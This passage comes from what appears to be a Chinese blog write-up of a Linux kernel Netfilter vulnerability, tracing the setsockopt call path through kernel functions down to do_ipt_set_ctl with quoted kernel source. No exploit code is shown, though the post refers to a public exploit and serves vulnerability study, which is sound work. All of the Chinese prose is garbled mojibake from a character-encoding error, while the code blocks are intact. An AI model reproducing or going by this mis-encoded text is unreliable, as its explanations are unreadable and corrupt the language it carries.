äº†ï¼Œå°±ç•™ä¸‹æ¥äº†ï¼Œå¦‚æœåªå…³æ³¨æ¼æ´æœ¬èº«çš„å¯ä»¥ç›´æ¥è·³è¿‡XD æ„Ÿå…´è¶£çš„è¯å¯ä»¥ç®€å•çœ‹çœ‹</p></blockquote><p>ç”¨æˆ·è¿›ç¨‹ä¸ Netfilter é—´è¿›è¡Œé€šä¿¡ä¸»è¦æ˜¯é€šè¿‡ <code>getsockopt</code> ä¸ <code>setsockopt</code> è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ˜¯ä¸€å¥—é…å¯¹ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨ä»¥è¯»å–æˆ–ä¿®æ”¹å¥—æ¥å­—çš„é…ç½®ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿™ä¸€æ¬¡ä¸»è¦å…³æ³¨ <code>setsockopt</code></p><blockquote><p>æœ¬æ¬¡æ¼æ´åˆ©ç”¨ä¸­æˆ‘ä»¬åˆ›å»º socket æ—¶ä½¿ç”¨ <code>socket(AF_INTE, SOCK_STREAM, 0)</code>ï¼Œæ•…åé¢æ¶‰åŠåˆ°çš„ socket æºç éƒ½ä¼šé¡ºç€è¿™ä¸ªè·¯å¾„åˆ†æ</p></blockquote><p>åœ¨ <code>setsockopt</code> ç³»ç»Ÿè°ƒç”¨ä¸­ä¼šè°ƒç”¨åˆ°å†…æ ¸ä¸­çš„ <code>__sys_setsockopt()</code> ï¼Œæœ€ç»ˆè°ƒç”¨åˆ°å¯¹åº”çš„ socket ç»“æ„ä½“çš„å‡½æ•°è¡¨ä¸­çš„ <code>setsockopt</code> å‡½æ•°æŒ‡é’ˆï¼ˆ <code>sock-&gt;ops-&gt;setsockopt()</code>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __sys_setsockopt(<span class="type">int</span> fd, <span class="type">int</span> level, <span class="type">int</span> optname,</span><br><span class="line">    <span class="type">char</span> __user *optval, <span class="type">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">err =</span><br><span class="line">    sock_setsockopt(sock, level, optname, optval,</span><br><span class="line">    optlen);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">err =</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,</span><br><span class="line">  optlen);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°è¡¨å…¶å®æ˜¯åœ¨ socket åˆ›å»ºæ—¶ï¼ˆ<code>__sock_create()</code>ï¼‰è¿›è¡ŒåŠ¨æ€æŒ‡å®šçš„ï¼Œé€šè¿‡å¯¹åº” family æŒ‡å®šçš„åˆ›å»ºå‡½æ•°è¿›è¡Œåˆ›å»ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sock_create(<span class="keyword">struct</span> net *net, <span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol,</span><br><span class="line"> <span class="keyword">struct</span> socket **res, <span class="type">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">pf = rcu_dereference(net_families[family]);</span><br><span class="line">err = -EAFNOSUPPORT;</span><br><span class="line"><span class="keyword">if</span> (!pf)</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment"> * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">err = pf-&gt;create(net, sock, protocol, kern);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´å¯¹äº <code>AF_INET</code> ï¼ˆ<code>PF_INET</code>ï¼‰è€Œè¨€ï¼Œåº”è¯¥ç”¨åˆ°çš„æ˜¯ <code>inet_create()</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">.family = PF_INET,</span><br><span class="line">.create = inet_create,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>inet_init()</code> å‡½æ•°ä¸­ä½¿ç”¨ <code>sock_register</code> åœ¨ <code>net_families</code> æ•°ç»„ä¸­æ³¨å†Œäº†è¯¥ç»“æ„ä½“ï¼ˆ<code>__init</code> å®å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæ¨¡å—åˆå§‹åŒ–å‡½æ•°ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">inet_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Tell SOCKET that we are alive...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>)sock_register(&amp;inet_family_ops);</span><br></pre></td></tr></table></figure><p>è€Œåœ¨ <code>inet_create()</code> ä¸­ï¼Œåˆ™æ˜¯éå† æ•°ç»„æ‰¾åˆ°å¯¹åº”ç±»å‹çš„å‡½æ•°è¡¨ç»™åˆ° socketï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">inet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> *<span class="title">answer</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> *<span class="title">answer_prot</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> answer_flags;</span><br><span class="line"><span class="type">int</span> try_loading_module = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (protocol &lt; <span class="number">0</span> || protocol &gt;= IPPROTO_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock-&gt;state = SS_UNCONNECTED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look for the requested type/protocol pair. */</span></span><br><span class="line">lookup_protocol:</span><br><span class="line">err = -ESOCKTNOSUPPORT;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="built_in">list</span>) &#123;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Check the non-wild match. */</span></span><br><span class="line"><span class="keyword">if</span> (protocol == answer-&gt;protocol) &#123;</span><br><span class="line"><span class="keyword">if</span> (protocol != IPPROTO_IP)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Check for the two wild cases. */</span></span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == protocol) &#123;</span><br><span class="line">protocol = answer-&gt;protocol;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sock-&gt;ops = answer-&gt;ops;</span><br><span class="line">    answer_prot = answer-&gt;prot;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä½¿ç”¨å†…æ ¸çš„ rcu éå†å® <code>list_for_each_entry_rcu</code> å¯¹ <code>inetsw</code> è¿›è¡Œéå†ï¼Œå®é™…ä¸Šè¯¥é“¾è¡¨é€šè¿‡ <code>inetsw_array</code> å»ºç«‹ï¼Œå¯¹äº <code>IPPROTO_IP</code> è€Œè¨€å…¶å‡½æ•°è¡¨åº”ä¸º <code>inet_stream_ops</code>ï¼ˆæˆ‘ä»¬åœ¨å»ºç«‹ socket æ—¶ protocol æŒ‡å®šä¸º 0ï¼Œå³ <code>IPPROTO_IP</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> <span class="title">inetsw_array</span>[] =</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">.type =       SOCK_STREAM,</span><br><span class="line">.protocol =   IPPROTO_TCP,</span><br><span class="line">.prot =       &amp;tcp_prot,</span><br><span class="line">.ops =        &amp;inet_stream_ops,</span><br><span class="line">.flags =      INET_PROTOSW_PERMANENT |</span><br><span class="line">      INET_PROTOSW_ICSK,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åœ¨è¿›è¡Œ setsockopt æ—¶å…¶å®å¯¹åº”åº”è¯¥è°ƒç”¨åˆ° <code>inet_stream_ops</code> ä¸­çš„ <code>sock_common_setsockopt</code>ï¼Œä»–åˆä¼šè°ƒç”¨åˆ° <code>sk-&gt;sk_prot-&gt;setsockopt()</code>ï¼Œå…¶å®å°±æ˜¯ socket ç»“æ„ä½“é‡Œçš„ sock ç»“æ„ä½“é‡Œçš„ sock_common ç»“æ„ä½“çš„ <code>skc_prot</code> æˆå‘˜ï¼ˆ<code>proto</code> ç»“æ„ä½“ç±»å‹ï¼‰çš„ <code>setsockopt</code> å‡½æ•°æŒ‡é’ˆï¼ˆ<del>ä½ å¥—ä½ ğŸ¦„å‘¢</del>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sock_common_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">   <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_common_setsockopt);</span><br></pre></td></tr></table></figure><p>åˆç»•å›å‰é¢ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯¹åº”åˆ° <code>tcp_prot</code> å‡½æ•°è¡¨ï¼Œå¯¹åº”è°ƒç”¨åˆ° <code>tcp_setsockopt()</code>ï¼Œåœ¨å…¬å¼€çš„ exp ä¸­æ¼æ´è§¦å‘è·¯å¾„æŒ‡å®šäº† level ä¸º <code>SOL_IP</code>ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥ä¼šå¯¹åº”è°ƒç”¨åˆ° <code>icsk-&gt;icsk_af_ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tcp_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">char</span> __user *optval,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_TCP)</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,</span><br><span class="line">     optval, optlen);</span><br><span class="line"><span class="keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tcp_setsockopt);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ <code>inet_csk()</code> å±•å¼€å…¶å®å°±æ˜¯ä¸€ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬åˆè¦è½¬å›å»çœ‹ socket ä¸­ sock ç»“æ„ä½“çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œåœ¨ <code>inet_create()</code>  ä¸­ä½¿ç”¨ <code>sock_alloc()</code> åˆ›å»º sock ç»“æ„ä½“ï¼Œæœ€åä¼šè°ƒç”¨åˆ° <code>tcp_v4_init_sock</code>ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å…¶åˆå§‹åŒ–æ‰€ç”¨çš„å‡½æ•°è¡¨ä¸º <code>ipv4_specific</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">tcp_v4_init_sock</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line">tcp_init_sock(sk);</span><br><span class="line"></span><br><span class="line">icsk-&gt;icsk_af_ops = &amp;ipv4_specific;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCP_MD5SIG</span></span><br><span class="line">tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€ååº”è¯¥è°ƒç”¨åˆ° <code>ip_setsockopt</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock_af_ops</span> <span class="title">ipv4_specific</span> =</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">.setsockopt   = ip_setsockopt,</span><br><span class="line">.getsockopt   = ip_getsockopt,</span><br></pre></td></tr></table></figure><p>åœ¨  <code>ip_setsockopt</code> ä¸­æœ€ç»ˆè°ƒç”¨åˆ° <code>nf_setsockopt</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level,</span></span><br><span class="line"><span class="params"><span class="type">int</span> optname, <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_IP)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">err = do_ip_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> IS_ENABLED(CONFIG_BPFILTER_UMH)</span></span><br><span class="line"><span class="keyword">if</span> (optname &gt;= BPFILTER_IPT_SO_SET_REPLACE &amp;&amp;</span><br><span class="line">    optname &lt; BPFILTER_IPT_SET_MAX)</span><br><span class="line">err = bpfilter_ip_set_sockopt(sk, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NETFILTER</span></span><br><span class="line"><span class="comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span></span><br><span class="line"><span class="keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;</span><br><span class="line">optname != IP_IPSEC_POLICY &amp;&amp;</span><br><span class="line">optname != IP_XFRM_POLICY &amp;&amp;</span><br><span class="line">!ip_mroute_opt(optname))</span><br><span class="line">err = nf_setsockopt(sk, PF_INET, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(ip_setsockopt);</span><br></pre></td></tr></table></figure><p>è€Œ setsockopt ä¸ getsockopt å…¶å®éƒ½æ•´åˆåˆ°äº† <code>nf_sockopt()</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call get/setsockopt() */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nf_sockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val,</span></span><br><span class="line"><span class="params">      <span class="type">char</span> __user *opt, <span class="type">int</span> *len, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ops = nf_sockopt_find(sk, pf, val, get);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get)</span><br><span class="line">ret = ops-&gt;get(sk, val, opt, len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;<span class="built_in">set</span>(sk, val, opt, *len);</span><br><span class="line"></span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">nf_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val, <span class="type">char</span> __user *opt,</span></span><br><span class="line"><span class="params">  <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> nf_sockopt(sk, pf, val, opt, &amp;len, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nf_setsockopt);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çœ‹å‡ºå…¶é€šè¿‡ <code>nf_sockopt_find</code> æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°è¡¨ä»è€Œè°ƒç”¨å…¶å¯¹åº”çš„å‡½æ•°ï¼Œè¿™é‡Œ setsockopt å¯¹åº”è°ƒç”¨åˆ°çš„åº”è¯¥æ˜¯ <code>do_ipt_set_ctl()</code></p><p><img src="https://s2.loli.net/2022/03/29/R4a7BPc8zq9Ko25.png" alt="image.png"></p><p>ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªå‡½æ•°ï¼Ÿè¿™é‡Œæˆ‘ä»¬å›åˆ° <code>nf_sockopt_find</code> ä¸­ï¼Œå…¶ä½¿ç”¨å†…æ ¸åŒå‘é“¾è¡¨éå†å®éå†å…¨å±€å˜é‡<code>nf_sockopts</code>ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯å‡½æ•°è¡¨çš„ pf ç­‰äºæˆ‘ä»¬åœ¨ä¸Šå±‚ä¼ å…¥çš„ pfï¼ˆåœ¨ <code>ip_setsockopt</code> ä¸­ä¼ å…¥çš„ä¸º <code>PF_INET</code>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> nf_sockopt_ops *<span class="title function_">nf_sockopt_find</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf,</span></span><br><span class="line"><span class="params"><span class="type">int</span> val, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;nf_sockopt_mutex);</span><br><span class="line">list_for_each_entry(ops, &amp;nf_sockopts, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;pf == pf) &#123;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ops-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_nosup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;get_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;set_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">out_nosup:</span><br><span class="line">ops = ERR_PTR(-ENOPROTOOPT);</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;nf_sockopt_mutex);</span><br><span class="line"><span class="keyword">return</span> ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>åœ¨ iptables æ¨¡å—çš„åˆå§‹åŒ–å‡½æ•°ä¸­æ³¨å†Œäº†å‡½æ•°è¡¨</strong> <code>ipt_sockopts</code>ï¼Œ<code>nf_register_sockopt()</code> ç”¨ä»¥åœ¨ <code>nf_sockopts</code> é“¾è¡¨ä¸­æ’å…¥èŠ‚ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ip_tables_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register setsockopt */</span></span><br><span class="line">ret = nf_register_sockopt(&amp;ipt_sockopts);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸€åˆ‡å°±æ¸…æ¥šäº†ï¼Œå¯¹äº setsockopt ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬æœ€ç»ˆè°ƒç”¨çš„åº”è¯¥æ˜¯ <code>do_ipt_set_ctl</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span 